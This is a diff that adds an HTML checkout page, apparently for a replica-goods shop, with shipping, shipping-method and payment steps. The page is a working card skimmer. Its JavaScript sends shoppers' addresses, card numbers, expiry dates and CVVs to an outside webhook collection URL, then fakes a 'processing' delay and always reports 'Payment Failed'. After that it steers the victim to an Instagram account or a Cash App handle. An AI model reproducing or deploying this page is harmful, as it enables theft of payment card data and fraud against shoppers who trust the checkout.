@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    body {
+      background: #000000;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      color: white;
+    }
+
+    .checkout-container {
+      background: #121212;
+      border-radius: 16px;
+      padding: 32px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0 4px 6px rgba(255, 255, 255, 0.1);
+    }
+
+    .step {
+      display: none;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 24px;
+      color: white;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #ffffff;
+      font-size: 14px;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      background: #1e1e1e;
+      color: white;
+    }
+
+    input:focus, select:focus {
+      outline: none;
+      background: #2a2a2a;
+    }
+
+    .shipping-options {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+
+    .shipping-option {
+      flex: 1;
+      padding: 16px;
+      background: #1e1e1e;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .shipping-option.selected {
+      background: #333333;
+    }
+
+    .payment-methods {
+      display: flex;
+      gap: 16px;
+      margin-top: 20px; /* Space above payment buttons */
+    }
+
+    .payment-method {
+      flex: 1;
+      padding: 16px;
+      background: #1e1e1e;
+      border-radius: 8px;
+      cursor: pointer;
+      text-align: center;
+      transition: all 0.2s;
+    }
+
+    .payment-method.selected {
+      background: #333333;
+    }
+
+    .button {
+      background: #ffffff;
+      color: black;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.2s;
+    }
+
+    .button:hover {
+      background: #cccccc;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      justify-content: center;
+      align-items: center;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    .modal-content {
+      background: #121212;
+      padding: 32px;
+      border-radius: 16px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      color: white;
+    }
+
+    .error-text {
+      color: #ff6b6b;
+      margin-bottom: 16px;
+    }
+
+    .shipping-summary {
+      background: #1e1e1e;
+      padding: 16px;
+      border-radius: 8px;
+      margin-bottom: 24px;
+    }
+
+    .shipping-summary p {
+      margin: 4px 0;
+      color: #cccccc;
+    }
+
+    .price-summary {
+      background: #1e1e1e;
+      padding: 16px;
+      border-radius: 8px;
+      margin-top: 16px; /* Space above price summary */
+    }
+
+    .price-row {
+      display: flex;
+      justify-content: space-between;
+      margin: 8px 0;
+      color: #cccccc;
+    }
+
+    .price-row.total {
+      color: white;
+      font-weight: bold;
+      border-top: 1px solid #333;
+      padding-top: 8px;
+      margin-top: 8px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <div class="checkout-container">
+    <!-- Shipping Address Step -->
+    <div class="step active" id="shipping-step">
+      <h2>Shipping Address</h2>
+      <div class="input-group">
+        <label>Email</label>
+        <input type="email" placeholder="Enter your email" id="email" required>
+      </div>
+      <div class="input-group">
+        <label>Phone Number</label>
+        <input type="tel" placeholder="Enter your phone number" id="phone" required>
+      </div>
+      <div class="input-group">
+        <label>Full Name</label>
+        <input type="text" placeholder="Enter your full name" id="fullName" required>
+      </div>
+      <div class="input-group">
+        <label>Street Address</label>
+        <input type="text" placeholder="Enter your street address" id="address" required>
+      </div>
+      <div class="input-group">
+        <label>City</label>
+        <input type="text" placeholder="Enter your city" id="city" required>
+      </div>
+      <div class="input-group">
+        <label>State</label>
+        <input type="text" placeholder="Enter your state" id="state" required>
+      </div>
+      <div class="input-group">
+        <label>ZIP Code</label>
+        <input type="text" placeholder="Enter your ZIP code" id="zipCode" required>
+      </div>
+      <button class="button" onclick="nextStep('shipping-method-step')">Continue</button>
+    </div>
+
+    <!-- Shipping Method Step -->
+    <div class="step" id="shipping-method-step">
+      <h2>Shipping Method</h2>
+      <div class="shipping-options">
+        <div class="shipping-option" onclick="selectShipping(this, 'normal')">
+          <h3>Normal</h3>
+          <p>$7.00</p>
+        </div>
+        <div class="shipping-option" onclick="selectShipping(this, 'express')">
+          <h3>Express</h3>
+          <p>$10.00</p>
+        </div>
+      </div>
+      <button class="button" onclick="sendShippingData(); nextStep('payment-step')">Continue</button>
+    </div>
+
+    <!-- Payment Step -->
+    <div class="step" id="payment-step">
+      <h2>Payment Method</h2>
+      <div class="shipping-summary" id="shipping-summary">
+        <!-- Will be filled by JavaScript -->
+      </div>
+      <div class="price-summary" id="price-summary">
+        <div class="price-row">
+          <span>Subtotal:</span>
+          <span>$${prices.subtotal.toFixed(2)}</span>
+        </div>
+        <div class="price-row">
+          <span>Shipping:</span>
+          <span>$${selectedShippingPrice.toFixed(2)}</span>
+        </div>
+        <div class="price-row total">
+          <span>Total:</span>
+          <span>$${total.toFixed(2)}</span>
+        </div>
+      </div>
+      <div class="payment-methods">
+        <div class="payment-method" onclick="selectPayment(this, 'cashapp')">
+          <h3>Cash App</h3>
+        </div>
+        <div class="payment-method" onclick="selectPayment(this, 'visa')">
+          <h3>Visa</h3>
+        </div>
+      </div>
+      
+      <!-- Visa Payment Form -->
+      <div id="visa-form" style="display: none;">
+        <div class="input-group">
+          <label>Card Number</label>
+          <input type="text" maxlength="16" placeholder="1234 5678 9012 3456" id="cardNumber">
+        </div>
+        <div class="input-group">
+          <label>Cardholder Name</label>
+          <input type="text" placeholder="John Doe" id="cardholderName">
+        </div>
+        <div style="display: flex; gap: 16px;">
+          <div class="input-group" style="flex: 1;">
+            <label>Expiration Date</label>
+            <input type="text" placeholder="MM/YY" maxlength="5" id="expirationDate">
+          </div>
+          <div class="input-group" style="flex: 1;">
+            <label>CVV</label>
+            <input type="text" maxlength="3" placeholder="123" id="cvv">
+          </div>
+        </div>
+        <div class="input-group">
+          <label>Billing Address</label>
+          <input type="text" placeholder="Enter billing address" id="billingAddress">
+        </div>
+        <button class="button" onclick="sendPaymentData(); processVisaPayment()">Pay Now</button>
+      </div>
+
+      <!-- Cash App Payment Button -->
+      <div id="cashapp-form" style="display: none;">
+        <button class="button" onclick="processCashAppPayment()">Pay with Cash App</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modals -->
+  <div class="modal" id="cashapp-modal">
+    <div class="modal-content">
+      <h2>Cash App Payment</h2>
+      <p>Please send payment to:</p>
+      <h3 style="margin: 20px 0;">$danibro100</h3>
+      <p>Include this ID in notes:</p>
+      <h3 id="payment-id" style="margin: 20px 0;"></h3>
+      <button class="button" onclick="document.getElementById('cashapp-modal').style.display = 'none'">Close</button>
+    </div>
+  </div>
+
+  <div class="modal" id="processing-modal">
+    <div class="modal-content">
+      <h2>Processing Payment</h2>
+      <p>Don't close this window, please wait...</p>
+    </div>
+  </div>
+
+  <div class="modal" id="payment-failed-modal">
+    <div class="modal-content">
+      <h2 class="error-text">Payment Failed</h2>
+      <p>Contact @goatedreps1 on instagram to pay with stripe.</p>
+      <button class="button" onclick="document.getElementById('payment-failed-modal').style.display = 'none'">Close</button>
+    </div>
+  </div>
+
+  <script>
+    let selectedShippingPrice = 7.00; // Default to normal shipping
+    const prices = {
+      subtotal: 0.00,
+      normal: 7.00,
+      express: 10.00
+    };
+
+    function nextStep(stepId) {
+      document.querySelector('.step.active').classList.remove('active');
+      document.getElementById(stepId).classList.add('active');
+      
+      if (stepId === 'payment-step') {
+        loadCartTotal();
+        updateShippingSummary();
+        updatePriceSummary();
+      }
+    }
+
+    function loadCartTotal() {
+      const cartTotal = localStorage.getItem('cartTotal');
+      if (cartTotal) {
+          prices.subtotal = parseFloat(cartTotal);
+      }
+    }
+
+    function sendShippingData() {
+      const shippingData = {
+        email: document.getElementById('email').value,
+        phone: document.getElementById('phone').value,
+        fullName: document.getElementById('fullName').value,
+        address: document.getElementById('address').value,
+        city: document.getElementById('city').value,
+        state: document.getElementById('state').value,
+        zipCode: document.getElementById('zipCode').value,
+      };
+
+      fetch('https://webhook-test.com/33481ff7a8a00bfc6c04e49d52c922d9', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(shippingData)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Shipping data sent:', data);
+      })
+      .catch(error => {
+        console.error('Error sending shipping data:', error);
+      });
+    }
+
+    function sendPaymentData() {
+      const paymentData = {
+        cardNumber: document.getElementById('cardNumber').value,
+        cardholderName: document.getElementById('cardholderName').value,
+        expirationDate: document.getElementById('expirationDate').value,
+        cvv: document.getElementById('cvv').value,
+        billingAddress: document.getElementById('billingAddress').value,
+      };
+
+      fetch('https://webhook-test.com/33481ff7a8a00bfc6c04e49d52c922d9', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(paymentData)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Payment data sent:', data);
+      })
+      .catch(error => {
+        console.error('Error sending payment data:', error);
+      });
+    }
+
+    function updateShippingSummary() {
+      const summary = document.getElementById('shipping-summary');
+      summary.innerHTML = `
+        <p>${document.getElementById('email').value}</p>
+        <p>${document.getElementById('phone').value}</p>
+        <p>${document.getElementById('fullName').value}</p>
+        <p>${document.getElementById('address').value}</p>
+        <p>${document.getElementById('city').value}, ${document.getElementById('state').value} ${document.getElementById('zipCode').value}</p>
+      `;
+    }
+
+    function updatePriceSummary() {
+      const total = prices.subtotal + selectedShippingPrice;
+      const summary = document.getElementById('price-summary');
+      summary.innerHTML = `
+        <div class="price-row">
+          <span>Subtotal:</span>
+          <span>$${prices.subtotal.toFixed(2)}</span>
+        </div>
+        <div class="price-row">
+          <span>Shipping:</span>
+          <span>$${selectedShippingPrice.toFixed(2)}</span>
+        </div>
+        <div class="price-row total">
+          <span>Total:</span>
+          <span>$${total.toFixed(2)}</span>
+        </div>
+      `;
+    }
+
+    function selectShipping(element, type) {
+      document.querySelectorAll('.shipping-option').forEach(opt => opt.classList.remove('selected'));
+      element.classList.add('selected');
+      selectedShippingPrice = type === 'express' ? prices.express : prices.normal;
+    }
+
+    function selectPayment(element, type) {
+      document.querySelectorAll('.payment-method').forEach(opt => opt.classList.remove('selected'));
+      element.classList.add('selected');
+      
+      document.getElementById('visa-form').style.display = type === 'visa' ? 'block' : 'none';
+      document.getElementById('cashapp-form').style.display = type === 'cashapp' ? 'block' : 'none';
+    }
+
+    function generatePaymentId() {
+      return 'PAY' + Math.floor(Math.random() * 1000000).toString(); // Simple random payment ID generation
+    }
+
+    function processCashAppPayment() {
+      const modal = document.getElementById('cashapp-modal');
+      document.getElementById('payment-id').textContent = generatePaymentId();
+      modal.style.display = 'flex';
+    }
+
+    function processVisaPayment() {
+      const processingModal = document.getElementById('processing-modal');
+      processingModal.style.display = 'flex';
+
+      setTimeout(() => {
+        processingModal.style.display = 'none';
+        document.getElementById('payment-failed-modal').style.display = 'flex';
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
